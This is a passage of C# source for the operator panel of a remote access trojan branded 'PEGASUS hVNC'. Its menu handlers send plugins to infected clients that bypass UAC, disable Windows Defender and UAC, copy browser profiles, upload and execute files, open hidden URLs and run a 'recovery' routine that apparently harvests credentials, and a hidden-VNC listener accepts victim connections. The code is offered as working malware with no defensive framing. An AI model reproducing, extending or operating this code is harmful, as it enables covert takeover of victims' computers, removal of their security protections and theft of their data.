                    Properties.Settings.Default.Save();
                    var listener = new Listener();
                    try
                    {
                        //ew Thread(() =>
                        //
                        Server.BeginDisconnect(true, EndAccept, null);
                        Server.Disconnect(true);
                        Server.Dispose();
                        Server.Close();
                        listener.Disconnect(Properties.Settings.Default.Ports);
                        //).Start();
                    }
                    catch
                    {
                    }
                }
                else
                {
                    var listener = new Listener();
                    try
                    {
                        //ew Thread(() =>
                        //
                        Server.BeginDisconnect(true, EndAccept, null);
                        Server.Disconnect(true);
                        Server.Dispose();
                        Server.Close();
                        listener.Disconnect(Properties.Settings.Default.Ports);
                        //).Start();
                    }
                    catch
                    {
                    }
                }

                // ushort port = GetPortSafe();
                Listener.ForeColor = Color.Red;
                Listener.Text = "Not Listening ";
                // guna2Transition2.HideSync(buttonspanel);
            }
        }

        /// <summary>
        /// The EndAccept.
        /// </summary>
        /// <param name="ar">The ar<see cref="IAsyncResult"/>.</param>
        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                new Clients(Server.EndAccept(ar));
            }
            catch
            {
            }
            finally
            {
                Server.BeginAccept(EndAccept, null);
            }
        }

        /// <summary>
        /// The stopToolStripMenuItem3_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void stopToolStripMenuItem3_Click_1(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The openHVNCPanelToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void openHVNCPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The windowsToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass3";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    //if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                    // {

                    //}
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The windowsToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void windowsToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    //if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                    //{

                    //}
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The windows7ToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void windows7ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uacbypass2";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                        if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The adminLoopToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void adminLoopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "uac";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\OPT.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                    //if (client.LV.SubItems[lv_admin.Index].Text != "Administrator")
                    // {

                    // }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The chkSounds_CheckedChanged.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void chkSounds_CheckedChanged(object sender, EventArgs e)
        {
            if (chkSounds.Checked)
            {
                Properties.Settings.Default.Sound = true;
                Properties.Settings.Default.Save();
            }
            else
            {
                Properties.Settings.Default.Sound = false;
                Properties.Settings.Default.Save();
            }
        }

        /// <summary>
        /// The copyProfileToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void copyProfileToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "CopyProfile";


                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\ZEUS.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The killWindowsDefenderToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void killWindowsDefenderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                //DialogResult dialogResult = MessageBox.Show(this, "Run this Only as Admin.", "Disable Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                //if (dialogResult == DialogResult.Yes)
                //{
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "disableDefedner";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        //if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                        //{
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        // }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The disableUACToolStripMenuItem_Click_1.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void disableUACToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
                //DialogResult dialogResult = MessageBox.Show(this, "Only for Admin.", "Disbale UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                // if (dialogResult == DialogResult.Yes)
                //{
                try
                {
                    var packet = new MsgPack();
                    packet.ForcePathObject("Pac_ket").AsString = "disableUAC";

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
                    msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum(@"Plugins\Ex.dll");
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());

                    foreach (var client in GetSelectedClients())
                    {
                        //if (client.LV.SubItems[lv_admin.Index].Text == "Admin")
                        // {
                        client.LV.ForeColor = Color.FromArgb(191, 38, 33);
                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                        // }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
        }

        /// <summary>
        /// The uploadExecuteToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void uploadExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                        msgPack.ForcePathObject("File")
                            .SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        //msgPack.ForcePathObject("Update").AsString = "true";
                        var msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        foreach (var clients in GetSelectedClients())
                        {
                            clients.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The moveClientToHVNCToolStripMenuItem_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void moveClientToHVNCToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                using (var openFileDialog = new OpenFileDialog())
                {
                    if (openFileDialog.ShowDialog() == DialogResult.OK)
                    {
                        var msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
                        msgPack.ForcePathObject("File")
                            .SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                        msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
                        msgPack.ForcePathObject("Update").AsString = "true";
                        var msgPack2 = new MsgPack();
                        msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
                        msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
                        msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
                        foreach (var clients in GetSelectedClients())
                        {
                            clients.LV.ForeColor = Color.Red;
                            ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// Defines the PROCESS_DPI_AWARENESS.
        /// </summary>
        private enum PROCESS_DPI_AWARENESS
        {
            /// <summary>
            /// Defines the Process_DPI_Unaware.
            /// </summary>
            Process_DPI_Unaware = 0,

            /// <summary>
            /// Defines the Process_System_DPI_Aware.
            /// </summary>
            Process_System_DPI_Aware = 1,

            /// <summary>
            /// Defines the Process_Per_Monitor_DPI_Aware.
            /// </summary>
            Process_Per_Monitor_DPI_Aware = 2
        }

        /// <summary>
        /// The GetSelectedClients.
        /// </summary>
        /// <returns>The <see cref="Clients[]"/>.</returns>
        private Clients[] GetSelectedClients()
        {
            var clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
           {
               lock (Settings.LockListviewClients)
               {
                   if (listView1.SelectedItems.Count == 0) return;
                   foreach (ListViewItem itm in listView1.SelectedItems) clientsList.Add((Clients)itm.Tag);
               }
           }));
            return clientsList.ToArray();
        }

        /// <summary>
        /// The GetAllClients.
        /// </summary>
        /// <returns>The <see cref="Clients[]"/>.</returns>
        private Clients[] GetAllClients()
        {
            var clientsList = new List<Clients>();
            Invoke((MethodInvoker)(() =>
           {
               lock (Settings.LockListviewClients)
               {
                   if (listView1.Items.Count == 0) return;
                   foreach (ListViewItem itm in listView1.Items) clientsList.Add((Clients)itm.Tag);
               }
           }));
            return clientsList.ToArray();
        }

        /// <summary>
        /// The Connect.
        /// </summary>
        private async void Connect()
        {
            //ushort port = GetPortSafe();
            try
            {
                await Task.Delay(1000);
                var ports = Properties.Settings.Default.Ports.Split(',');
                foreach (var port in ports)
                    if (!string.IsNullOrWhiteSpace(port))
                    {
                        var listener = new Listener();
                        var thread = new Thread(listener.Connect);
                        thread.IsBackground = true;
                        thread.Start(Convert.ToInt32(port.Trim()));
                    }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        /// <summary>
        /// Defines the _clientList.
        /// </summary>
        public static List<TcpClient> _clientList;

        /// <summary>
        /// Defines the _TcpListener.
        /// </summary>
        public static TcpListener _TcpListener;

        /// <summary>
        /// Defines the VNC_Thread.
        /// </summary>
        private Thread VNC_Thread;

        /// <summary>
        /// Defines the SelectClient.
        /// </summary>
        public static int SelectClient;

        /// <summary>
        /// Defines the bool_1.
        /// </summary>
        public static bool bool_1;

        /// <summary>
        /// Defines the int_2.
        /// </summary>
        public static int int_2;

        /// <summary>
        /// Defines the count.
        /// </summary>
        public int count;

        /// <summary>
        /// Defines the PEGASUSRecoveryResults.
        /// </summary>
        public static string PEGASUSRecoveryResults;

        /// <summary>
        /// Gets or sets the MassURL.
        /// </summary>
        public static string MassURL { get; set; }

        /// <summary>
        /// Gets or sets the saveurl.
        /// </summary>
        public static string saveurl { get; set; }

        /// <summary>
        /// Defines the ispressed.
        /// </summary>
        public static bool ispressed = false;

        /// <summary>
        /// Gets or sets the xxhostname.
        /// </summary>
        public string xxhostname { get; set; }

        /// <summary>
        /// Gets or sets the xxip.
        /// </summary>
        public string xxip { get; set; }

        /// <summary>
        /// The connectToolStripMenuItem1_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private async void connectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            //if (listView1.SelectedItems.Count > 0)
            try
            {
                await uploadPlugin(sender, e);
                MsgBox.Show("Hvnc executed succesfully!Open HVNC Panel Now!");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return;
            }
        }

        /// <summary>
        /// The btnStarthvnc_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnStarthvnc_Click(object sender, EventArgs e)
        {
            if (label9.Text.Contains("Not Listening")) // Check if listen or not
            {
                //btnStarthvnc.Text = "Stop";

                btnStarthvnc.Enabled = true;

                btnStarthvnc.Image = imageList2.Images[0];

                HVNCListenPort.Enabled = false;

                VNC_Thread = new Thread(Listenning) // Listenning
                {
                    IsBackground = true
                };

                bool_1 = true;

                VNC_Thread.Start();

                label9.Text = "Listening";
            }
            else if (label9.Text.Contains("Listening")) // Check if listen or not
            {
                {


                    IEnumerator enumerator = default(IEnumerator);
                    while (true)
                    {
                        try
                        {
                            try
                            {
                                enumerator = Application.OpenForms.GetEnumerator();
                                while (enumerator.MoveNext())
                                {
                                    Form form = (Form)enumerator.Current;
                                    if (form.Name.Contains("FrmVNC"))
                                    {
                                        form.Dispose();
                                    }

                                }
                            }
                            finally
                            {
                                if (enumerator is IDisposable)
                                {
                                    (enumerator as IDisposable).Dispose();
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            //MessageBox.Show(ex.Message);
                            continue;
                        }

                        break;
                    }

                    HVNCListenPort.Enabled = true;
                    VNC_Thread.Abort();
                    bool_1 = false;
                    label9.Text = "Not Listening";
                    btnStarthvnc.Image = imageList2.Images[1];
                    btnStarthvnc.Enabled = true;
                    HVNCList.Items.Clear();
                    _TcpListener.Stop();
                    checked
                    {
                        int num = _clientList.Count - 1;
                        for (int i = 0; i <= num; i++)
                        {
                            _clientList[i].Close();
                        }

                        _clientList = new List<TcpClient>();
                        int_2 = 0;
                        label13.Text = "Status : Connections: 0";
                    }
                }
            }
        }

        /// <summary>
        /// The btnStopHvnc_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnStopHvnc_Click(object sender, EventArgs e)
        {
        }

        /// <summary>
        /// The SendTCP.
        /// </summary>
        /// <param name="object_0">The object_0<see cref="object"/>.</param>
        /// <param name="tcpClient_1">The tcpClient_1<see cref="TcpClient"/>.</param>
        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {
            try
            {
                lock (tcpClient_1)
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                    MemoryStream memoryStream = new MemoryStream();
                    binaryFormatter.Serialize((Stream)memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                    ulong position = checked((ulong)memoryStream.Position);
                    tcpClient_1.GetStream().Write(BitConverter.GetBytes(position), 0, 8);
                    byte[] buffer = memoryStream.GetBuffer();
                    tcpClient_1.GetStream().Write(buffer, 0, checked((int)position));
                    memoryStream.Close();
                    memoryStream.Dispose();
                }
            }
            catch (Exception ex)
            {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
            }
        }

        /// <summary>
        /// The btnVisitUrl_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnVisitUrl_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, Design.MsgBox.Icon.Shield);
                }
                else
                {
                    int num2 = (int)new FrmURL().ShowDialog();
                    if (!PEGALISIUS.ispressed)
                        return;
                    FrmVNC FrmVNCnc = new FrmVNC();
                    foreach (object selectedItem in this.HVNCList.SelectedItems)
                        this.count = this.HVNCList.SelectedItems.Count;
                    for (int index = 0; index < this.count; ++index)
                    {
                        FrmVNCnc.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
                        object tag = this.HVNCList.SelectedItems[index].Tag;
                        FrmVNCnc.Tag = tag;
                        FrmVNCnc.hURL(PEGALISIUS.saveurl);
                        FrmVNCnc.Dispose();
                    }
                    MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
                    PEGALISIUS.ispressed = false;
                }
            }
            catch (Exception ex)
            {
                MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
                this.Close();
            }
        }

        /// <summary>
        /// The btnUploadExec_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnUploadExec_Click(object sender, EventArgs e)
        {
            try
            {
                if (this.HVNCList.SelectedItems.Count == 0)
                {
                    MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
                }
                else
                {
                    int num2 = (int)new FrmMassUpdate().ShowDialog();
                    if (!PEGALISIUS.ispressed)
                        return;
                    FrmVNC FrmVNCnc = new FrmVNC();
                    foreach (object selectedItem in this.HVNCList.SelectedItems)
                        this.count = this.HVNCList.SelectedItems.Count;
                    for (int index = 0; index < this.count; ++index)
                    {
                        FrmVNCnc.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
                        object tag = this.HVNCList.SelectedItems[index].Tag;
                        FrmVNCnc.Tag = tag;
                        FrmVNCnc.UpdateClient(PEGALISIUS.MassURL);
                        FrmVNCnc.Dispose();
                    }
                    MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
                    PEGALISIUS.ispressed = false;
                }
            }
            catch (Exception ex)
            {
                MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
                this.Close();
            }
        }

        /// <summary>
        /// The btnKillChrome_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnKillChrome_Click(object sender, EventArgs e)
        {
            FrmVNC FrmVNCnc = new FrmVNC();
            foreach (object selectedItem in this.HVNCList.SelectedItems)
                this.count = this.HVNCList.SelectedItems.Count;
            for (int index = 0; index < this.count; ++index)
            {
                FrmVNCnc.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
                object tag = this.HVNCList.SelectedItems[index].Tag;
                FrmVNCnc.Tag = tag;
                FrmVNCnc.KillChrome();
                FrmVNCnc.Dispose();
            }
            MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
        }

        /// <summary>
        /// The btnRecover_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnRecover_Click(object sender, EventArgs e)
        {
            if (this.HVNCList.SelectedItems.Count == 0)
            {
                MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
            }
            else
            {
                FrmVNC FrmVNCnc = new FrmVNC();
                foreach (object selectedItem in this.HVNCList.SelectedItems)
                    this.count = this.HVNCList.SelectedItems.Count;
                for (int index = 0; index < this.count; ++index)
                {
                    FrmVNCnc.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
                    object tag = this.HVNCList.SelectedItems[index].Tag;
                    string str1 = this.HVNCList.SelectedItems[index].SubItems[0].ToString().Replace("ListViewSubItem", (string)null).Replace("{", (string)null).Replace("}", (string)null).Replace(":", (string)null).Remove(0, 1);
                    string str2 = this.HVNCList.SelectedItems[index].SubItems[3].ToString().Replace("ListViewSubItem", (string)null).Replace("{", (string)null).Replace("}", (string)null).Replace(":", (string)null).Remove(0, 1);
                    this.xxip = str1;
                    this.xxhostname = str2;
                    FrmVNCnc.xip = str1;
                    FrmVNCnc.xhostname = str2;
                    FrmVNCnc.Tag = tag;
                    FrmVNCnc.PEGASUSRecovery();
                    FrmVNCnc.Dispose();
                }
                MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
            }
        }

        /// <summary>
        /// The btnRemoveHvnc_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnRemoveHvnc_Click(object sender, EventArgs e)
        {
            if (this.HVNCList.SelectedItems.Count == 0)
            {
                MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
            }
            else
            {

                foreach (object selectedItem in this.HVNCList.SelectedItems)
                    this.count = this.HVNCList.SelectedItems.Count;
                for (int index = 0; index < this.count; ++index)
                {

                    object tag = this.HVNCList.SelectedItems[index].Tag;
                    string str1 = this.HVNCList.SelectedItems[index].SubItems[0].ToString().Replace("ListViewSubItem", (string)null).Replace("{", (string)null).Replace("}", (string)null).Replace(":", (string)null).Remove(0, 1);
                    string str2 = this.HVNCList.SelectedItems[index].SubItems[3].ToString().Replace("ListViewSubItem", (string)null).Replace("{", (string)null).Replace("}", (string)null).Replace(":", (string)null).Remove(0, 1);
                    this.SendTCP((object)("8889* "), (TcpClient)tag);
                    if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                        return;
                    this.SendTCP((object)"24*", (TcpClient)tag);
                    this.SendTCP((object)("8889* "), (TcpClient)tag);
                }

                //MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
            }
        }

        /// <summary>
        /// The btnresetScale_Click.
        /// </summary>
        /// <param name="sender">The sender<see cref="object"/>.</param>
        /// <param name="e">The e<see cref="EventArgs"/>.</param>
        private void btnresetScale_Click(object sender, EventArgs e)
        {
            FrmVNC FrmVNCnc = new FrmVNC();
            foreach (object selectedItem in this.HVNCList.SelectedItems)
                this.count = this.HVNCList.SelectedItems.Count;
            for (int index = 0; index < this.count; ++index)
            {
                FrmVNCnc.Name = "FrmVNC:" + Conversions.ToString(this.HVNCList.SelectedItems[index].GetHashCode());
                object tag = this.HVNCList.SelectedItems[index].Tag;
                FrmVNCnc.Tag = tag;
                FrmVNCnc.ResetScale();
                FrmVNCnc.Dispose();
            }
            MsgBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
        }

        /// <summary>
        /// The Listenning.
        /// </summary>
        private void Listenning()
        {
            checked
            {
                try
                {
                    _clientList = new List<TcpClient>();
                    _TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(HVNCListenPort.Text));
                    _TcpListener.Start();
                    _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                    try
                    {
                        if (!ex.Message.Contains("aborted"))
                        {
                            IEnumerator enumerator = default(IEnumerator);
                            while (true)
                            {
                                try
                                {
                                    try
                                    {
                                        enumerator = Application.OpenForms.GetEnumerator();
                                        while (enumerator.MoveNext())
                                        {
                                            Form form = (Form)enumerator.Current;
                                            if (form.Name.Contains("FrmVNC"))
                                            {
                                                form.Dispose();
                                            }

                                        }
                                    }
                                    finally
                                    {
                                        if (enumerator is IDisposable)
                                        {
                                            (enumerator as IDisposable).Dispose();
                                        }
                                    }
                                }
                                catch (Exception ex1)
                                {
                                    //MessageBox.Show(ex1.Message);
                                    continue;
                                }
                                break;
                            }

                            bool_1 = false;
                            label9.Text = "Listening";
                            int num = _clientList.Count - 1;
                            for (int i = 0; i <= num; i++)
                            {
                                _clientList[i].Close();
                            }
                            _clientList = new List<TcpClient>();
                            int_2 = 0;
                            _TcpListener.Stop();
                            label13.Text = "Status : Connections: 0";
                        }
                    }
                    catch (Exception ex3)
                    {
                        //MessageBox.Show(ex3.Message);
                    }
                }
            }
        }

        /// <summary>
        /// Defines the random.
        /// </summary>
        public static Random random = new Random();

        /// <summary>
        /// The RandomNumber.
        /// </summary>
        /// <param name="length">The length<see cref="int"/>.</param>
        /// <returns>The <see cref="string"/>.</returns>
        public static string RandomNumber(int length)
        {
            const string chars = "0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        /// <summary>
        /// The ResultAsync.
        /// </summary>
        /// <param name="iasyncResult_0">The iasyncResult_0<see cref="IAsyncResult"/>.</param>
        public void ResultAsync(IAsyncResult iasyncResult_0)
        {

            try
            {
                TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
                tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                _TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// The ReadResult.
        /// </summary>
        /// <param name="iasyncResult_0">The iasyncResult_0<see cref="IAsyncResult"/>.</param>
        public void ReadResult(IAsyncResult iasyncResult_0)
        {

            TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
            checked
            {
                try
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;

                    byte[] array = new byte[8];
                    int num = 8;
                    int num2 = 0;

                    while (num > 0)
                    {
                        int num3 = tcpClient.GetStream().Read(array, num2, num);
                        num -= num3;
                        num2 += num3;
                    }

                    ulong num4 = BitConverter.ToUInt64(array, 0);
